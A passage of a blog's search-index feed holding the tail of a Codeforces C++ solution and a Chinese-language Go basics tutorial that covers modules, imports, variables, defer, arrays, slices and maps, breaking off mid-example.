class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    cin &gt;&gt; p[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    q[i] = p[(i + <span class="number">1</span>) % n];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    cout &lt;&lt; q[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="built_in">solve</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> codeforces </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础</title>
      <link href="/2024/08/08/golang/go%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/08/08/golang/go%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="golang"><a href="#golang" class="headerlink" title="golang"></a>golang</h1><h3 id="go简介"><a href="#go简介" class="headerlink" title="go简介"></a>go简介</h3><ul><li><code>GOROOT</code> 是Go语言的安装路径。</li><li><p><code>GOPATH</code> 是一个环境变量，代表了Go语言的工作空间目录。从Go 1.11版本开始，引入了模块管理（Module）系统，通过<code>go mod</code>命令来管理依赖，这使得开发Go应用时不再强制要求将代码放在<code>GOPATH</code>目录下。</p></li><li><p>golang只存在值传递（<code>值的副本</code>（深拷贝）、<code>指针的副本</code>（浅拷贝））</p></li></ul><p>golang的优势：</p><ul><li><strong>编译型语言</strong>：Go是编译型语言，<code>静态链接</code>，运行时可不依赖库。（1.5版本后支持动态链接）</li><li><strong>语言层并发:</strong>基于<strong>CSP（Communicating Sequential Processes）并发模型</strong>，提供了<code>轻量级线程（goroutines）</code>和<code>通道（channels）</code>机制，使得并发编程更加高效和简洁。</li><li><strong>简单易学：</strong>支持内嵌c语言，关键词少，面向对象，跨平台</li></ul><p>缺点：</p><ul><li>包管理，大部分包都在github上</li><li>所有<code>Exception</code>都由<code>Error</code>处理</li><li><strong>缺少泛型</strong>：在Go 1.18版本之前，Go 1.18引入了泛型。</li><li>C语言更接近硬件，提供了更多的底层控制，而Go语言则在保证性能的同时，更注重开发效率和代码的安全性。当需要在Go中使用C代码时，通常需要通过<code>cgo</code>进行桥接。</li></ul><p>go编译运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go run my.go //编译运行</span><br><span class="line">    </span><br><span class="line">go build my.go   //编译</span><br><span class="line">./my//运行</span><br></pre></td></tr></table></figure><h3 id="go生态"><a href="#go生态" class="headerlink" title="go生态"></a>go生态</h3><ul><li>Web：beego、gin、echo、iris</li><li>微服务：go kit、 istio</li><li>容器编排：k8s、swarm</li><li>服务发现：consul</li><li>存储引擎：etcd（k/v存储）、tidb（分布式存储）</li><li>静态建站：hugo</li><li>中间件：nsq（消息队列）、zinx（tcp长连接框架，轻量级服务器）、Leaf（游戏服务器）、gPRC（RPC框架）、codis（redis集群）</li><li>爬虫框架： go query</li></ul><h3 id="go路径与导包"><a href="#go路径与导包" class="headerlink" title="go路径与导包"></a>go路径与导包</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mygo.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;golangstudy/lib1&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;    </span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello from main&quot;</span>)</span><br><span class="line">    <span class="comment">// 调用 lib1 包中的 Hello 函数</span></span><br><span class="line">    lib1.Hello()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// lib1/lib1.go</span></span><br><span class="line"><span class="keyword">package</span> lib1</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">()</span></span> &#123;<span class="comment">//大写导出</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello from lib1&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>直接导入需要关闭<code>go moudle</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env -w GO111MODULE=off</span><br></pre></td></tr></table></figure><ul><li><p>编译器会尝试在<code>$GOROOT/src</code>和<code>$GOPATH/是如此、</code>寻找对应包，且路径不需要包含文件名。</p></li><li><p>在go1.11版本后可使用<code>go modules</code>导包。</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── lib1</span><br><span class="line">│   └── lib1.go</span><br><span class="line">└── my.go</span><br></pre></td></tr></table></figure><h4 id="go-方法名大小写"><a href="#go-方法名大小写" class="headerlink" title="go 方法名大小写"></a><strong>go 方法名大小写</strong></h4><ul><li><p>首字母大写方法被称为<code>导出方法（exported methods）</code>，它们可以在包的外部被访问，类似于其他语言中的 public 方法。</p></li><li><p>首字母小写方法被称为<code>未导出方法（unexported methods）</code>，它们只能在定义它们的包内部被访问，类似于其他语言中的 private 方法。</p></li></ul><h4 id="点、匿名和别名导包"><a href="#点、匿名和别名导包" class="headerlink" title="点、匿名和别名导包"></a><strong>点、匿名和别名导包</strong></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    _ <span class="string">&quot;golangstudy/lib1&quot;</span>   <span class="comment">// 匿名导入，仅调用 lib1 包的 init() 函数，不能调用lib1其他函数</span></span><br><span class="line">    mylib <span class="string">&quot;golangstudy/lib1&quot;</span> <span class="comment">// 别名导入，使用 mylib 作为别名</span></span><br><span class="line">    . <span class="string">&quot;golangstudy/lib1&quot;</span>    <span class="comment">// 点导入，直接使用 lib1 包的导出成员，类似cpp的using namesapce </span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="GOMODULES"><a href="#GOMODULES" class="headerlink" title="GOMODULES"></a>GOMODULES</h3><ul><li>GOPATH<ul><li><code>bin</code> 存储编译生成的可执行文件。</li><li><code>pkg</code>存储编译生成的包文件。</li><li><code>src</code> ：存储 Go 源代码文件。</li><li>GOPATH缺点：<ul><li>无版本控制</li><li>无法同步一致第三方版本号</li><li>无法指定当前项目引用的第三方版本号</li></ul></li></ul></li></ul><p><strong>GOMODOULES</strong></p><ul><li><code>GO111MODULE</code>：开启go mod</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br></pre></td></tr></table></figure><ul><li><code>GOPROXY</code>：修改为国内镜像，<code>direct</code>指示符用于指示go回到模块版本的源地址抓取</li><li><code>GOSUMBDB</code>：检验拉取的模块数据，通过<code>GOPROXY</code>修改代理解决</li><li><code>GOPRIVATE</code>（作为<code>GONOPROXY</code>和<code>GONOSUMDB</code>默认值）：用于指示私有模块，可通过通配符设置</li></ul><p>初始化gomod并为项目命名</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go mod init [name]</span><br></pre></td></tr></table></figure><ul><li><strong>自动下载依赖</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go mod tidy</span><br></pre></td></tr></table></figure><ul><li><strong>手动下载依赖</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get [包路径]</span><br></pre></td></tr></table></figure><p><strong>GOPATH/pkg/mod</strong>：用于存储下载的模块版本，以供本地项目使用。</p><p><strong>GOSUM文件</strong></p><p><code>go.sum</code>文件包含以下格式的条目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;module&gt; &lt;version&gt; &lt;hash&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;module&gt;</code>：依赖模块的路径。</li><li><code>&lt;version&gt;</code>：依赖模块的版本号。</li><li><code>&lt;hash&gt;</code>：依赖模块版本文件的哈希值。通常是两个哈希值，一个是校验和（checksum），另一个是用于验证模块内容的哈希。</li></ul><h3 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h3><p>go的包名类似于cpp的命名空间，同一包名的代码将在编译时合并,包名要求：</p><ul><li>包名应该是一个小写单词。</li><li>包名通常与其所在的目录名称相同。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">//程序的包名与文件名无关</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span> <span class="comment">//导入包，提供格式化输入输出的函数</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">//go分号必须在函数名后</span></span><br><span class="line">fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="变量声明与格式化字符串"><a href="#变量声明与格式化字符串" class="headerlink" title="变量声明与格式化字符串"></a>变量声明与格式化字符串</h3><p>go有多种变量声明方式，但是一般采用第四种方式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">package</span> main <span class="comment">//程序的包名与文件名无关</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span> <span class="comment">//导入包，提供格式化输入输出的函数</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">//go分号必须在函数名后</span></span><br><span class="line"><span class="comment">//方式一，声明变量a，默认初始化为0</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方式二，初始化变量</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">string</span> = <span class="string">&quot;Randolfluo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方式三，省去数据类型</span></span><br><span class="line"><span class="keyword">var</span> c = <span class="number">2</span><span class="comment">//自动推导为int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方式四,省去var关键词，但是这种方式不能声明全局变量</span></span><br><span class="line">d := <span class="number">3.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方式五，初始化多个变量</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">e <span class="type">int</span> = <span class="number">3</span></span><br><span class="line">f <span class="type">int</span> = <span class="number">4</span></span><br><span class="line">)</span><br><span class="line">fmt.Printf(<span class="string">&quot;a=%d,b=%s,c=%d,d=%f,e=%d,f=%d\n&quot;</span>, a, b, c, d, e, f)</span><br><span class="line">fmt.Printf(<span class="string">&quot;a=%T,b=%T,c=%T,d=%T,e=%T,f=%T\n&quot;</span>, a, b, c, d, e, f)</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>golang常用的格式化字符串</p><ul><li><code>%T</code>：输出值的类型。</li><li><code>%t</code>：布尔值。</li><li><code>%d</code>：整型十进制表示。</li><li><code>%x</code>, <code>%X</code>：整型十六进制表示。</li><li><code>%f</code>, <code>%F</code>：浮点数。</li><li><code>%s</code>：字符串。</li><li><code>%q</code>：带双引号的字符串或字符。</li><li><code>%p</code>：指针。</li><li><code>%v</code>：表示任意类型。</li></ul><h3 id="const-与-iota"><a href="#const-与-iota" class="headerlink" title="const 与 iota"></a>const 与 iota</h3><ul><li><code>const</code>用于定义常量</li><li><code>iota</code>用于标识枚举的<code>行</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">package</span> main </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span> </span><br><span class="line">)</span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">a, b = <span class="literal">iota</span> + <span class="number">1</span>, <span class="literal">iota</span> + <span class="number">2</span><span class="comment">//line 0</span></span><br><span class="line">c, d<span class="comment">//line 1</span></span><br><span class="line">e, f = <span class="literal">iota</span> + <span class="number">2</span>, <span class="literal">iota</span> + <span class="number">2</span><span class="comment">//line 2</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">fmt.Println(a, b, c, d, e, f)</span><br><span class="line"> <span class="comment">//1 2 2 3 4 4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多返回值"><a href="#多返回值" class="headerlink" title="多返回值"></a>多返回值</h3><ul><li><p>Go 语言使用多返回值来接收数据和错误。这是 Go 的一个设计哲学，它鼓励开发者显式地处理错误，而不是依赖于异常或全局的错误状态。</p></li><li><p>在 Go 中，许多标准库函数和方法都会返回两个值：第一个是函数的主要返回结果，第二个是 <code>error</code> 类型，用于指示是否发生了错误。如果没有错误发生，<code>error</code> 值通常是 <code>nil</code>。</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">package</span> main </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span> </span><br><span class="line">)</span><br><span class="line"><span class="comment">//多返回值， 有形参名称</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add_dsc</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (add <span class="type">int</span>, dsc <span class="type">int</span>)&#123;</span><br><span class="line"><span class="comment">//add dsc属于函数的局部变量，默认初始化为0</span></span><br><span class="line">add = a + b</span><br><span class="line">dsc = a - b</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">add, dsc := add_dsc(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">fmt.Println(add, dsc)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h3><p>类似于cpp的析构函数，用于返回时释放资源。</p><ul><li>其执行顺序类似于栈</li><li><code>defer</code> 语句会在 <code>return</code> 之后执行。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">funcA</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;A&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">funcB</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;C&quot;</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;B&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> funcA()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">funcB()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//A</span></span><br><span class="line"><span class="comment">//B</span></span><br><span class="line"><span class="comment">//C</span></span><br></pre></td></tr></table></figure><h3 id="数组-amp-切片slice"><a href="#数组-amp-切片slice" class="headerlink" title="数组&amp;切片slice"></a>数组&amp;切片slice</h3><p><strong>数组</strong></p><ul><li>长度固定。</li><li>类型相同。</li><li>在内存中连续分配。</li><li>作为值类型，传递时会<code>复制整个数组</code>。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">change_array</span><span class="params">(arr [10]<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">1144514</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//数组声明，初始化为0</span></span><br><span class="line"><span class="keyword">var</span> Array1 [<span class="number">10</span>]<span class="type">int</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(Array1); i++ &#123;</span><br><span class="line">fmt.Print(Array1[i], <span class="string">&quot; &quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println()</span><br><span class="line"></span><br><span class="line"><span class="comment">//数组声明，初始化为1-10</span></span><br><span class="line"><span class="keyword">var</span> Array2 [<span class="number">10</span>]<span class="type">int</span> = [<span class="number">10</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;</span><br><span class="line"><span class="keyword">for</span> idx, val := <span class="keyword">range</span> Array2 &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Array2[%d] = %d\n&quot;</span>, idx, val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//值传递方式为深拷贝,函数的修改不会影响原函数</span></span><br><span class="line">change_array(Array2)</span><br><span class="line">fmt.Printf(<span class="string">&quot;Array2[0] = %d\n&quot;</span>, Array2[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>切片slice</strong></p><ul><li>长度动态。</li><li>类型相同。</li><li>底层通常由数组支持。</li><li>作为引用类型，<code>传递时不会复制底层数组</code>（复制指针）。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">change_slice1ay</span><span class="params">(slice1 []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">slice1[<span class="number">0</span>] = <span class="number">1144514</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> slice0 []<span class="type">int</span> <span class="comment">//声明一个切片，但是未初始化空间</span></span><br><span class="line"><span class="keyword">if</span> slice0 == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;slice0 is nil&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;slice0 is not nil&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slice1 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125; <span class="comment">//初始化slice1为1-5</span></span><br><span class="line"><span class="comment">//切片传递实际为浅拷贝，传递的是指针，函数的修改会影响原slice1</span></span><br><span class="line">change_slice1ay(slice1)</span><br><span class="line">fmt.Println(slice1)</span><br><span class="line"></span><br><span class="line">slice3 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">5</span>, <span class="number">10</span>) <span class="comment">//初始化slice2为长度为5，容量为10</span></span><br><span class="line">fmt.Println(slice3)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="built_in">len</span>(slice3), <span class="built_in">cap</span>(slice3), slice3)</span><br><span class="line"></span><br><span class="line">slice3 = <span class="built_in">append</span>(slice3, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>) <span class="comment">//追加元素，容量不够，扩容</span></span><br><span class="line">fmt.Println(<span class="built_in">len</span>(slice3), <span class="built_in">cap</span>(slice3), slice3)</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接赋值是将一个切片的地址赋值给另一个地址</span></span><br><span class="line">slice4 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">slice5 := slice4[<span class="number">0</span>:<span class="number">3</span>] <span class="comment">//切片</span></span><br><span class="line">slice5[<span class="number">0</span>] = <span class="number">100</span>       <span class="comment">//修改切片</span></span><br><span class="line">fmt.Println(slice4)</span><br><span class="line">fmt.Println(slice5)</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过copy构造一个新切片</span></span><br><span class="line">slice6 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">copy</span>(slice6, slice4)</span><br><span class="line">slice6[<span class="number">0</span>] = <span class="number">114514</span></span><br><span class="line">fmt.Println(slice4)</span><br><span class="line">fmt.Println(slice6)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>map传参属于浅拷贝，复制指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changemap</span><span class="params">(m <span class="keyword">map</span>[<span class="type">int</span>]<span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> k, _ := <span class="keyword">range</span> m &#123;</span><br><span class="line">m[k] = <span class="string">&quot;Randolfluo&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//方式一</span></span><br><span class="line"><span class="keyword">var</span> map1 <span class="keyword">map</span>[<span class="type">int</span>]<span class="type">string</span>     <span class="comment">//声明空map</span></span><br><span class="line">map1 = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">string</span>) <span 